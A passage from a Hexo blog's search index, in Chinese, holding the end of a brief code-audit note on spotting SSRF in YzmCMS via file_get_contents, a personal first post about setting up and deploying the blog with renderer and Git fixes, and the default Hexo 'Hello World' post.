代码审计-SSRF-Yzmcms功能&amp;函数</strong></p><p>功能点采集</p><p>函数：file_get_contents函数存在读取功能</p><p>可以通过搜索file_get_contents来找ssrf漏洞，因为存在服务器的请求</p><p>总结：</p><p>特定漏洞功能–&gt;代码段分析审计</p><p>特定漏洞函数–&gt;测试对应的功能判断</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2023/01/17/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/01/17/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>.撒拉嘿哟撒拉嘿哟~~</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/qyc.jpg"></p><p>我他妈今天终于成功了！！！搭建博客，明天开始写博客笔记咯！！！！潼潼~ ~ ~我爱你！！！</p><p>博客上传三件套：1、hexo cl   2、hexo g    3、hexo d </p><p>如果图标显示不正常，则使用上面三个后再次使用hexo g ，hexo s便显示正常了</p><blockquote><h4 id="博客渲染问题："><a href="#博客渲染问题：" class="headerlink" title="博客渲染问题："></a><strong>博客渲染问题</strong>：</h4><p><strong>在本地中使用英文引号，Hexo 渲染到网页时，会变成中文引号</strong></p><p><strong><a href="https://wyscjm.github.io/post/00_my/01_blog/myblog_02_problem_cn_quotes.html">MyBlog(02) 问题：英文的引号显示成中文了 | 冬天里太阳 (wyscjm.github.io)</a></strong></p><h6 id="解决方法，看自己用的是hexo什么渲染器，我用的是hexo默认的hexo-renderer-marked-渲染器"><a href="#解决方法，看自己用的是hexo什么渲染器，我用的是hexo默认的hexo-renderer-marked-渲染器" class="headerlink" title="解决方法，看自己用的是hexo什么渲染器，我用的是hexo默认的hexo-renderer-marked 渲染器"></a>解决方法，看自己用的是hexo什么渲染器，我用的是hexo默认的hexo-renderer-marked 渲染器</h6><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><h6 id="站点配置文件-config-yml（即-Hexo-根目录下的）中加入以下情况的内容。"><a href="#站点配置文件-config-yml（即-Hexo-根目录下的）中加入以下情况的内容。" class="headerlink" title="站点配置文件_config.yml（即 Hexo 根目录下的）中加入以下情况的内容。"></a>站点配置文件_config.yml（即 Hexo 根目录下的）中加入以下情况的内容。</h6><h6 id="Hexo-默认-hexo-renderer-marked-渲染器。"><a href="#Hexo-默认-hexo-renderer-marked-渲染器。" class="headerlink" title="Hexo 默认 hexo-renderer-marked 渲染器。"></a>Hexo 默认 hexo-renderer-marked 渲染器。</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">marked:</span><br><span class="line">  smartypants: false</span><br></pre></td></tr></table></figure><h6 id="hexo-renderer-kramed-渲染器。"><a href="#hexo-renderer-kramed-渲染器。" class="headerlink" title="hexo-renderer-kramed 渲染器。"></a>hexo-renderer-kramed 渲染器。</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kramed:</span><br><span class="line">  smartypants: false</span><br></pre></td></tr></table></figure><h6 id="hexo-renderer-markdown-it-渲染器。"><a href="#hexo-renderer-markdown-it-渲染器。" class="headerlink" title="hexo-renderer-markdown-it 渲染器。"></a>hexo-renderer-markdown-it 渲染器。</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    typographer: false</span><br></pre></td></tr></table></figure><h6 id="hexo-renderer-markdown-it-plus-渲染器。"><a href="#hexo-renderer-markdown-it-plus-渲染器。" class="headerlink" title="hexo-renderer-markdown-it-plus 渲染器。"></a>hexo-renderer-markdown-it-plus 渲染器。</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">markdown-it-plus:</span><br><span class="line">    typographer: false</span><br></pre></td></tr></table></figure></blockquote><h4 id="hexo-d遇到的问题："><a href="#hexo-d遇到的问题：" class="headerlink" title="hexo d遇到的问题："></a>hexo d遇到的问题：</h4><h5 id="Git解决fatal-Could-not-read-from-remote-repository-的问题-BreenCL的博客-CSDN博客"><a href="#Git解决fatal-Could-not-read-from-remote-repository-的问题-BreenCL的博客-CSDN博客" class="headerlink" title=" Git解决fatal: Could not read from remote repository.的问题_BreenCL的博客-CSDN博客"></a><strong><a href="https://blog.csdn.net/baoyin0822/article/details/122584931"> Git解决fatal: Could not read from remote repository.的问题_BreenCL的博客-CSDN博客</a></strong></h5><h5 id="解决Git-克隆代码-The-remote-end-hung-up-unexpectedly错误-Channon-的博客-CSDN博客"><a href="#解决Git-克隆代码-The-remote-end-hung-up-unexpectedly错误-Channon-的博客-CSDN博客" class="headerlink" title="解决Git 克隆代码 The remote end hung up unexpectedly错误_Channon_的博客-CSDN博客"></a><a href="https://blog.csdn.net/Cai_deLong/article/details/115255735">解决Git 克隆代码 The remote end hung up unexpectedly错误_Channon_的博客-CSDN博客</a></h5><h5 id="hexo发生error：spawn-failed错误的解决方法-error-spawn-failed-HuangTLhit的博客-CSDN博客https-blog-csdn-net-HTL2018-article-details-106876940"><a href="#hexo发生error：spawn-failed错误的解决方法-error-spawn-failed-HuangTLhit的博客-CSDN博客https-blog-csdn-net-HTL2018-article-details-106876940" class="headerlink" title=" hexo发生error：spawn failed错误的解决方法_error: spawn failed_HuangTLhit的博客-CSDN博客https://blog.csdn.net/HTL2018/article/details/106876940)"></a><a href="https://blog.csdn.net/HTL2018/article/details/106876940"> hexo发生error：spawn failed错误的解决方法_error: spawn failed_HuangTLhit的博客-CSDN博客</a><a href="https://blog.csdn.net/HTL2018/article/details/106876940">https://blog.csdn.net/HTL2018/article/details/106876940</a>)</h5><h5 id="解决fatal-No-configured-push-destination-知识驿站的博客-CSDN博客"><a href="#解决fatal-No-configured-push-destination-知识驿站的博客-CSDN博客" class="headerlink" title="解决fatal: No configured push destination._知识驿站的博客-CSDN博客"></a><a href="https://blog.csdn.net/weixin_43654123/article/details/124039969">解决fatal: No configured push destination._知识驿站的博客-CSDN博客</a></h5><h5 id="git-推送出现-“fatal-The-remote-end-hung-up-unexpectedly”-解决方案-Arviiin的博客-CSDN博客"><a href="#git-推送出现-“fatal-The-remote-end-hung-up-unexpectedly”-解决方案-Arviiin的博客-CSDN博客" class="headerlink" title=" git 推送出现 “fatal: The remote end hung up unexpectedly” 解决方案_Arviiin的博客-CSDN博客"></a><a href="https://blog.csdn.net/weixin_38450840/article/details/80701173"> git 推送出现 “fatal: The remote end hung up unexpectedly” 解决方案_Arviiin的博客-CSDN博客</a></h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/17/hello-world/"/>
      <url>/2023/01/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
